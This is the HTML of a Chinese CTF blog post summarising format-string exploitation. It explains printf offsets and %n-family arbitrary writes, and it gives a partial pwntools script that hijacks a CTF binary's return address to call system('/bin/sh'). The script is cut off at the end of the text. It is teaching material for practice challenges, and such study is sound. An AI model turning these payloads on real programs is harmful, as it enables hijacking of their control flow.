@@ -1,0 +1,798 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>格式化字符串专题总结 | Whali3n51&#39;s blog</title>
+  <meta name="keywords" content="">
+  <meta name="description" content="格式化字符串专题总结 | Whali3n51&#39;s blog">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="description" content="关于本人：现在是一个普通二本的一个大三的学生。干啥啥不行，吃饭第一名。">
+<meta property="og:type" content="website">
+<meta property="og:title" content="about">
+<meta property="og:url" content="http:&#x2F;&#x2F;whali3n51.github.io&#x2F;about&#x2F;index.html">
+<meta property="og:site_name" content="Whali3n51&#39;s blog">
+<meta property="og:description" content="关于本人：现在是一个普通二本的一个大三的学生。干啥啥不行，吃饭第一名。">
+<meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2019-12-09T03:41:32.111Z">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="icon" href="/img/avatar.jpg">
+
+<link href="/css/style.css?v=1.0.1" rel="stylesheet">
+
+<link href="/css/hl_theme/github.css?v=1.0.1" rel="stylesheet">
+
+<link href="//cdn.bootcss.com/animate.css/3.5.2/animate.min.css" rel="stylesheet">
+<link href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="/js/jquery.autocomplete.min.js?v=1.0.1" ></script>
+
+<script src="//cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.bootcss.com/nprogress/0.2.0/nprogress.min.js"></script>
+
+
+
+<script src="//cdn.bootcss.com/jquery-cookie/1.4.1/jquery.cookie.min.js" ></script>
+
+<script src="/js/iconfont.js?v=1.0.1" ></script>
+
+</head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="false">
+  <input class="theme_preload_comment" value="false">
+  <input class="theme_blog_path" value="">
+</div>
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/" class="avatar_target">
+    <img class="avatar" src="/img/avatar.jpg" />
+</a>
+<div class="author">
+    <span>Whali3n51</span>
+</div>
+
+<div class="icon">
+    
+        
+        <a title="email" href="mailto:Whali3n51@gmail.com" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-email"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+        <a title="qq" href="http://wpa.qq.com/msgrd?v=3&uin=1453872020&site=qq&menu=yes" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-qq"></use>
+                </svg>
+            
+        </a>
+        
+    
+</div>
+
+
+
+<a class="more-menus">更多菜单</a>
+
+
+<ul>
+    <li><div class="all active">全部文章<small>(23)</small></div></li>
+    
+        
+            
+            <li><div data-rel="pwn学习"><i class="fold iconfont icon-right"></i>pwn学习<small>(8)</small></div>
+                
+                    <ul class="sub hide">
+                        
+                        <li><div data-rel="Writeup">Writeup<small>(1)</small></div>
+                            
+                        </li>
+                            
+                    </ul>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="Writeup">Writeup<small>(7)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+        
+    
+        
+            
+            <li><div data-rel="其他">其他<small>(3)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="密码学">密码学<small>(1)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="RE">RE<small>(2)</small></div>
+                
+            </li>
+            
+        
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+    
+    
+    
+    
+    <a class="dynamic-menu " target="_blank"  href="https://github.com/Whali3n51">github</a>
+    
+    </div>
+    <div><a class="about  hasFriend  site_url"  href="/about">关于</a><a style="width: 50%"  class="friends">友链</a></div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="23">
+
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        友情链接
+        <i class="back-title-list"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="https://www.kkzevip.com/">MoR03r</a></li>
+            
+            <li><a target="_blank" href="https://pdsdt.ginkgoteam.com/">Pdsdt</a></li>
+            
+            <li><a target="_blank" href="http://www.dongzt.cn/">Alkaid</a></li>
+            
+            <li><a target="_blank" href="https://www.virzz.com/">Virink’s Blog</a></li>
+            
+            <li><a target="_blank" href="https://p1kk.github.io/">p1Kk</a></li>
+            
+            <li><a target="_blank" href="http://dittozzz.top/">ditto</a></li>
+            
+            <li><a target="_blank" href="http://blog.ragdoll.work/">咲夜南梦</a></li>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <form onkeydown="if(event.keyCode==13){return false;}">
+        <input class="search" type="text" placeholder="Search..." autocomplete="off"id="local-search-input" >
+        <i class="cross"></i>
+        <span>
+            <label for="tagswitch">Tags:</label>
+            <input id="tagswitch" type="checkbox" style="display: none" />
+            <i id="tagsWitchIcon"></i>
+        </span>
+    </form>
+    <div class="tags-list">
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" target="_blank" rel="noopener" class="color5">WP复现</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" target="_blank" rel="noopener" class="color4">pwn</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" target="_blank" rel="noopener" class="color1">盲打pwn</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" target="_blank" rel="noopener" class="color1">re_wp</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" target="_blank" rel="noopener" class="color2">多线程pwn</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" target="_blank" rel="noopener" class="color5">re复现</a>
+    </li>
+    
+    <div class="clearfix"></div>
+</div>
+
+    
+    <nav id="title-list-nav">
+        
+        <a  class="其他 "
+           href="/2020/01/01/happy-new-year/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="新年快乐">新年快乐</span>
+            <span class="post-date" title="2020-01-01 00:00:00">2020/01/01</span>
+        </a>
+        
+        <a  class=""
+           href="/2019/12/14/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%93%E9%A2%98%E6%80%BB%E7%BB%93/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="格式化字符串专题总结">格式化字符串专题总结</span>
+            <span class="post-date" title="2019-12-14 19:04:15">2019/12/14</span>
+        </a>
+        
+        <a  class="pwn学习 "
+           href="/2019/12/11/%E6%B5%85%E5%B0%9D%E5%A4%9A%E7%BA%BF%E7%A8%8Bpwn/"
+           data-tag="多线程pwn"
+           data-author="" >
+            <span class="post-title" title="浅尝多线程pwn">浅尝多线程pwn</span>
+            <span class="post-date" title="2019-12-11 21:48:20">2019/12/11</span>
+        </a>
+        
+        <a  class="pwn学习 "
+           href="/2019/12/10/D3CTF-new-heap%E5%A4%8D%E7%8E%B0/"
+           data-tag="WP复现"
+           data-author="" >
+            <span class="post-title" title="D3CTF_new_heap复现">D3CTF_new_heap复现</span>
+            <span class="post-date" title="2019-12-10 15:27:11">2019/12/10</span>
+        </a>
+        
+        <a  class="Writeup "
+           href="/2019/12/01/%E5%AE%89%E8%AF%A2%E6%9D%AFwp_pwn/"
+           data-tag="盲打pwn"
+           data-author="" >
+            <span class="post-title" title="安询杯pwn_wp">安询杯pwn_wp</span>
+            <span class="post-date" title="2019-12-01 13:40:00">2019/12/01</span>
+        </a>
+        
+        <a  class="pwn学习 Writeup "
+           href="/2019/11/28/RedHat/"
+           data-tag="WP复现"
+           data-author="" >
+            <span class="post-title" title="ReaHat_final_pwn">ReaHat_final_pwn</span>
+            <span class="post-date" title="2019-11-28 23:30:00">2019/11/28</span>
+        </a>
+        
+        <a  class="Writeup "
+           href="/2019/11/11/%E6%B9%96%E6%B9%98%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwn_wp/"
+           data-tag="pwn"
+           data-author="" >
+            <span class="post-title" title="湖湘杯线上赛pwn_wp">湖湘杯线上赛pwn_wp</span>
+            <span class="post-date" title="2019-11-11 14:14:00">2019/11/11</span>
+        </a>
+        
+        <a  class="Writeup "
+           href="/2019/11/11/HECTF/"
+           data-tag="pwn"
+           data-author="" >
+            <span class="post-title" title="HECTF_Pwn_wp">HECTF_Pwn_wp</span>
+            <span class="post-date" title="2019-11-11 13:51:00">2019/11/11</span>
+        </a>
+        
+        <a  class="Writeup "
+           href="/2019/11/11/%E4%B8%8A%E6%B5%B7%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8PWN_wp/"
+           data-tag="pwn"
+           data-author="" >
+            <span class="post-title" title="上海大学生网络安全PWN_wp">上海大学生网络安全PWN_wp</span>
+            <span class="post-date" title="2019-11-11 13:37:00">2019/11/11</span>
+        </a>
+        
+        <a  class="其他 "
+           href="/2019/09/01/%E7%BB%99%E6%96%B0%E7%94%9F%E2%80%94%E5%85%B3%E4%BA%8E%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%80%8E%E4%B9%88%E5%AD%A6%E4%B9%A0/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="给新生—关于二进制怎么学习">给新生—关于二进制怎么学习</span>
+            <span class="post-date" title="2019-09-01 12:41:00">2019/09/01</span>
+        </a>
+        
+        <a  class="Writeup "
+           href="/2019/09/01/five%E7%A9%BA%E9%97%B4%E5%A4%A7%E8%B5%9B/"
+           data-tag="pwn"
+           data-author="" >
+            <span class="post-title" title="five空间大赛">five空间大赛</span>
+            <span class="post-date" title="2019-09-01 11:22:00">2019/09/01</span>
+        </a>
+        
+        <a  class="Writeup "
+           href="/2019/09/01/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6PWN(2)/"
+           data-tag="pwn"
+           data-author="" >
+            <span class="post-title" title="攻防世界高手进阶PWN（２）">攻防世界高手进阶PWN（２）</span>
+            <span class="post-date" title="2019-09-01 11:09:00">2019/09/01</span>
+        </a>
+        
+        <a  class="其他 "
+           href="/2019/08/30/%E5%85%B3%E4%BA%8EWin10%E8%87%AA%E5%8A%A8%E6%9B%B4%E6%96%B01903%E4%B9%8B%E5%90%8E%E5%8F%AA%E8%83%BD%E6%96%B0%E5%BB%BA%E6%96%87%E4%BB%B6%E5%A4%B9/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="关于Win10自动更新1903之后只能新建文件夹">关于Win10自动更新1903之后只能新建文件夹</span>
+            <span class="post-date" title="2019-08-30 10:08:00">2019/08/30</span>
+        </a>
+        
+        <a  class="pwn学习 "
+           href="/2019/08/06/CN16/"
+           data-tag="WP复现"
+           data-author="" >
+            <span class="post-title" title="CISCN_final_CN16">CISCN_final_CN16</span>
+            <span class="post-date" title="2019-08-06 07:04:35">2019/08/06</span>
+        </a>
+        
+        <a  class="Writeup "
+           href="/2019/06/13/CISCN%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BApwn%E8%84%9A%E6%9C%AC%E5%8F%8A%E6%80%BB%E7%BB%93/"
+           data-tag="pwn"
+           data-author="" >
+            <span class="post-title" title="CISCN华北赛区pwn脚本及总结">CISCN华北赛区pwn脚本及总结</span>
+            <span class="post-date" title="2019-06-13 20:01:00">2019/06/13</span>
+        </a>
+        
+        <a  class="pwn学习 "
+           href="/2019/06/04/%E5%A0%86%E6%BA%A2%E5%87%BA%E7%9A%84unlink%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"
+           data-tag="pwn"
+           data-author="" >
+            <span class="post-title" title="堆溢出的unlink漏洞利用">堆溢出的unlink漏洞利用</span>
+            <span class="post-date" title="2019-06-04 14:41:00">2019/06/04</span>
+        </a>
+        
+        <a  class="pwn学习 "
+           href="/2019/06/02/Unsorted%20bin%20attack/"
+           data-tag="pwn"
+           data-author="" >
+            <span class="post-title" title="Unsorted bin attack">Unsorted bin attack</span>
+            <span class="post-date" title="2019-06-02 17:54:00">2019/06/02</span>
+        </a>
+        
+        <a  class="pwn学习 "
+           href="/2019/05/31/%E5%BC%BA%E7%BD%91%E6%9D%AF%EF%BC%9A%E5%BC%BA%E7%BD%91%E5%85%88%E9%94%8B_AP_Pwn%20%20writeup/"
+           data-tag="pwn"
+           data-author="" >
+            <span class="post-title" title="强网杯：强网先锋_AP_Pwn  writeup">强网杯：强网先锋_AP_Pwn  writeup</span>
+            <span class="post-date" title="2019-05-31 13:07:00">2019/05/31</span>
+        </a>
+        
+        <a  class="RE "
+           href="/2019/05/29/%E6%A1%82%E7%94%B5RE%E5%85%A8%E8%A7%A3WriteUp/"
+           data-tag="re_wp"
+           data-author="" >
+            <span class="post-title" title="桂电RE全解WriteUp">桂电RE全解WriteUp</span>
+            <span class="post-date" title="2019-05-29 13:23:00">2019/05/29</span>
+        </a>
+        
+        <a  class="RE "
+           href="/2019/05/28/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91testre/"
+           data-tag="re复现"
+           data-author="" >
+            <span class="post-title" title="西湖论剑testre">西湖论剑testre</span>
+            <span class="post-date" title="2019-05-28 22:15:00">2019/05/28</span>
+        </a>
+        
+        <a  class="密码学 "
+           href="/2019/05/28/RC4%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E7%9A%84%E5%8E%9F%E7%90%86%E8%AE%B2%E8%A7%A3/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="RC4加密算法的原理讲解">RC4加密算法的原理讲解</span>
+            <span class="post-date" title="2019-05-28 16:46:00">2019/05/28</span>
+        </a>
+        
+        <a  class="pwn学习 "
+           href="/2019/05/28/%E7%8E%B0%E4%BB%A3unlink%E6%BC%8F%E6%B4%9E%E8%AE%B2%E8%A7%A3%E4%B8%8E%E5%88%A9%E7%94%A8/"
+           data-tag="pwn"
+           data-author="" >
+            <span class="post-title" title="现代unlink漏洞讲解与利用">现代unlink漏洞讲解与利用</span>
+            <span class="post-date" title="2019-05-28 12:56:00">2019/05/28</span>
+        </a>
+        
+        <a  class=""
+           href="/2019/05/28/%E7%AE%80%E5%8D%95%E8%AE%B2%E8%A7%A3%E9%80%9A%E8%BF%87extend_overlopping%E6%9D%A5%E5%88%A9%E7%94%A8fast%20bin%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E4%BD%8D%E7%BD%AE%E7%9A%84%E8%AF%BB%E5%86%99/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="简单讲解通过extend_overlopping来利用fast bin实现任意位置的读写">简单讲解通过extend_overlopping来利用fast bin实现任意位置的读写</span>
+            <span class="post-date" title="2019-05-28 12:25:00">2019/05/28</span>
+        </a>
+        
+    </nav>
+</div>
+    </div>
+    <div class="hide-list">
+        <div class="semicircle">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div class="post">
+    <div class="pjax">
+        <article id="post-格式化字符串专题总结" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">格式化字符串专题总结</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        
+    </div>
+    <div class="article-meta">
+        
+        创建时间:<time class="date" title='更新时间: 2019-12-14 19:04:15'>2019-12-14 19:04</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        
+        <span id="busuanzi_container_page_pv">
+            阅读:<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+        <span class="top-comment" title="跳转至评论区">
+            <a href="#comments">
+                评论:<span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </a>
+        </span>
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞原理分析"><span class="toc-text">漏洞原理分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#32位格式化字符串利用"><span class="toc-text">32位格式化字符串利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#64位格式化字符串利用"><span class="toc-text">64位格式化字符串利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ebp-chain修改任意地址"><span class="toc-text">Ebp chain修改任意地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-text">总结</span></a></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>最近比赛有太多的格式化字符串漏洞，今天就来总结一下常见的格式化字符串。由易到难的讲解格式化字符串的利用和最近遇到格式化字符串的考点。</p>
+<h2 id="漏洞原理分析"><a href="#漏洞原理分析" class="headerlink" title="漏洞原理分析"></a>漏洞原理分析</h2><p>格式化字符串一般都是程序员为了偷懒而导致的漏洞。为了输出字符串，而直接使用printf(&amp;buf)来打印字符串。今天我们从原理上来讲解这样写为什么会产生漏洞。</p>
+<p>正常的使用printf(“%s”,&amp;buf);来打印字符串</p>
+<p>当call printf的时候栈上的结构为：</p>
+<p><img src="./1.png" alt=""></p>
+<p>这样函数就打印出第二个参数的地址上的字符串,这样就能正常打印出‘aaaa’。printf函数识别出‘%s’是一个格式化字符串，然后根据这个格式化字符串去取参数，’%s‘默认取第二个参数为作为字符串输出地址也就是‘%s’的下面一个栈空间，这样就能打印出‘aaaa’。</p>
+<p>如果我们程序员偷懒，不使用格式化字符串，那么我们还是能打印出来。</p>
+<p><img src="./2.png" alt=""></p>
+<p>因为printf没有解析到格式化字符串，直接将‘aaaa’作为格式化字符串输出了。这原理就像是我们平时用printf(“hello world !!”);这个道理是一样的。但是这个时候和printf(“hello world !!”);不一样的是，字符串是我们能控制的，这个时候漏洞就出现了。</p>
+<h2 id="32位格式化字符串利用"><a href="#32位格式化字符串利用" class="headerlink" title="32位格式化字符串利用"></a>32位格式化字符串利用</h2><p>如果我任意构造一个格式化字符串，printf就会去解析，然后就根据解析的内容，去栈上都读偏移，然后执行相应的功能。</p>
+<p>例如，我们输入一个‘%s’的格式化字符串，我们来分析他的原理。</p>
+<p><img src="./3.png" alt=""></p>
+<p>同理，printf解析出‘%s’了，相应的他要读出printf的第二个参数上的值。可是我们又没有给第二个参数，但是在程序里面，确认参数是不看你有没有输入，而是看栈的偏移。对于printf来说，第一个参数是栈顶，第二个参数是当前的[esp+4],第三个参数是[esp+8],依次类推。这里也就是输出‘&amp;buf’栈空间下面那个地址上的值。但是这个地方不确定是不是地址，所以程序可能打印失败。</p>
+<p>但是格式化字符串给了一个我们可以自动定位的一个格式化字符串‘%n$’的参数。也就是在这里可以自己定位栈空间。</p>
+<p>如果我们在这个给的是这‘%4$s’+p32(&amp;’hello world’)</p>
+<p><img src="./4.png" alt=""></p>
+<p>所以这个时候打印出来的就是’hello world’了。这个printf解析出有格式化串‘%4$s‘，也就是将buf栈下第4个栈空间的地址上的值当作字符串打印出来。注意这个p32(&amp;”hello world”)在这里只是做举例用，这个值我们可以写做任意一个值，也就是说我们能泄露任意地址上的值。这就达到了任意地址泄露。</p>
+<p>当然达到任意地址泄露往往只是成功了一半，我们还需要达到任意地址写。</p>
+<p>这个时候printf又提供了一个参数’%n‘,这个参数是将前面打印出来的字符数量写入到第二个参数的所指向的地址上的值。这个时候配合’%c‘可以写任意的值。当然这个’%n‘也可以结合’n$‘来使用，可以定位在栈上偏移。</p>
+<p>例如，我们想在0x80000000(只是举例，不保证地址的合法性)上面写一个0x66666666</p>
+<p>我们应该这样构造出这样的栈</p>
+<p><img src="./5.png" alt=""></p>
+<p>payload应该是这样%1717986918c%7$n+p32(0x80000000),这样就可以在0x80000000上面写0x66666666。</p>
+<p>但是一般这样写有个问题，靠%1717986918c打印出0x66666666需要很长时间，一般程序会死掉，所以不能直接这么写。但是printf还提供了一个%n同类的格式化字符串</p>
+<p>%n        一次性写入四个字节</p>
+<p>%hn    一次性写入两个字节</p>
+<p>%hhn        一次性写入一个字节</p>
+<p>然后我们可以这样构造</p>
+<p>%26214c%8$hn%9$hnaaa+p32(0x80000000)+p32(0x80000002)</p>
+<p>注意，构造的时候，在格式化的串直接不有’\x00‘字符串截断，不然printf不能解析格式化字符串了。</p>
+<p><img src="./6.png" alt=""></p>
+<p>这样就可以任意地址写了。</p>
+<p>一般来说，格式化字符串就是通过任意地址读写，来泄露got和修改got表来达到劫持程序流程。</p>
+<p>pwntools整合了32位格式化字符串的利用。</p>
+<p>fmtstr_payload(offset,{target_addr:value},write_size=’short’)自动就生成了payload,但是我不建议新手直接使用这个函数。</p>
+<p>原理讲解到这里了，来个例子：</p>
+<h2 id="64位格式化字符串利用"><a href="#64位格式化字符串利用" class="headerlink" title="64位格式化字符串利用"></a>64位格式化字符串利用</h2><p>64位的和32位的利用方式其实是差不多的，唯一的差别就是64位的传参方式不一样，所以偏移量不一样。64位传参方式是rdi,rsi,rdx,rcx,r8,r9。第一个参数已经被我们格式化字符串占用了，所以第%1$p是rsi的值，然后往后顺延，直到%6$p是栈上第一个数据，然后后面和32位差不多了。</p>
+<p>但是64位和32位还有一点不同的是，32位的地址一般能沾满整个栈单元，没有’\x00’字符，所以就不会无论地址写在格式化字符串前或者后面，都不会会造成格式化字符串的截断，但是64位不同，64位的地址一般不会沾满整个栈单元，一般只使用六个字节。所以会有’\x00’截断，如果把地址写在格式化字符串的前面，那么就会产生’\x00’截断，导致后面格式化字符串被截断不执行。</p>
+<p>好了  这里也举个例子说一下吧。</p>
+<h2 id="Ebp-chain修改任意地址"><a href="#Ebp-chain修改任意地址" class="headerlink" title="Ebp chain修改任意地址"></a>Ebp chain修改任意地址</h2><p>Ebp chain是格式化字符串比较高级的利用方式，前两种利用方式是我们输入的值直接在栈上，但是如果我们输入的值全在bss段上，那么我们怎么做到修改格式化字符串呢？</p>
+<p>通过上面的知识我们得知，想要修改或者读一个地址的值，那么这个地址就得在栈上。所以我们要想办法把这个地址写到栈上。这个说起来有点抽象，还是举个例子吧。</p>
+<p>这是swupctf的一道题。</p>
+<p>题目链接：<a href="./login"></a></p>
+<p>首先我们进IDA看一下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_804854B</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Please input your password: "</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    s1[<span class="built_in">read</span>(<span class="number">0</span>, s1, <span class="number">0x32</span>u)] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(s1, <span class="string">"wllmmllw"</span>, <span class="number">8u</span>) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"This is the wrong password: "</span>);</span><br><span class="line">    <span class="built_in">printf</span>(s1);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Try again!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Login successfully! Have fun!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们发现这是个无次数限制的格式化字符串利用。但是这里往bss段上写，不能像上面那样利用。这个时候我们看一下我们利用的时候，栈上的数据</p>
+<p><img src="./7.png" alt=""></p>
+<p>我们能看到栈上ebp的指针指向上一个ebp。上一个ebp指向上上个ebp。我们前面是不是说过只要有地址，我们就能往这个地址上写任意的值。</p>
+<p>这个时候我们可以这样利用。这里我们为了叙述，我们把当前ebp叫ebp1,我们上一个ebp叫ebp2,我们把上上个ebp叫做ebp3。</p>
+<p>这个时候我们需要转换思维，既然这个有值是栈地址，我们就不需要去修改got表再劫持程序了，我们直接修改老eip。</p>
+<p>我们可以这样利用，我们通过ebp1将ebp2的值，让他指向一个老eip。所以然后就可以利用了。然后通过ebp2去修改老eip的值。最后改为system地址</p>
+<p>我的脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">"./login"</span>)</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">elf=ELF(<span class="string">"./login"</span>)</span><br><span class="line">bss=<span class="number">0x804B0A0</span>+<span class="number">0xc</span>+<span class="number">0x10</span></span><br><span class="line">p.sendlineafter(<span class="string">"Please input your name: "</span>,<span class="string">'aaaa'</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'%6$p'</span></span><br><span class="line">gdb.attach(p,<span class="string">''' b *0x080485AF '''</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Please input your password: "</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">stack_addr=int(p.recv(<span class="number">8</span>),<span class="number">16</span>)+<span class="number">0x10</span></span><br><span class="line"><span class="keyword">print</span> hex(stack_addr)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'%15$p'</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">libc_start_main=int(p.recv(<span class="number">8</span>),<span class="number">16</span>)<span class="number">-247</span></span><br><span class="line">libc=LibcSearcher(<span class="string">"__libc_start_main"</span>,libc_start_main)</span><br><span class="line">system=libc_start_main-libc.dump(<span class="string">"__libc_start_main"</span>)+libc.dump(<span class="string">"system"</span>)</span><br><span class="line">str_bin_sh=libc_start_main-libc.dump(<span class="string">"__libc_start_main"</span>)+libc.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'%'</span>+str((stack_addr&amp;<span class="number">0xff</span>)<span class="number">-0xc</span>)+<span class="string">'c%6$hhn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,payload)</span><br><span class="line">payload=<span class="string">'%'</span>+str((system&amp;<span class="number">0xffff</span>))+<span class="string">'c%10$hn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,payload)</span><br><span class="line">payload=<span class="string">'%'</span>+str((stack_addr&amp;<span class="number">0xff</span>)<span class="number">-0xc</span>+<span class="number">2</span>)+<span class="string">'c%6$hhn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,payload)</span><br><span class="line">payload=<span class="string">'%'</span>+str((system&gt;&gt;<span class="number">16</span>))+<span class="string">'c%10$hn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'%'</span>+str((stack_addr&amp;<span class="number">0xff</span>)<span class="number">-0x4</span>)+<span class="string">'c%6$hhn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,payload)</span><br><span class="line">payload=<span class="string">'%'</span>+str((str_bin_sh&amp;<span class="number">0xffff</span>))+<span class="string">'c%10$hn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,payload)</span><br><span class="line">payload=<span class="string">'%'</span>+str((stack_addr&amp;<span class="number">0xff</span>)<span class="number">-0x4</span>+<span class="number">2</span>)+<span class="string">'c%6$hhn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,payload)</span><br><span class="line">payload=<span class="string">'%'</span>+str((str_bin_sh&gt;&gt;<span class="number">16</span>))+<span class="string">'c%10$hn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,payload)</span><br><span class="line">gdb.attach(p,<span class="string">''' b *0x080485AF '''</span>)</span><br><span 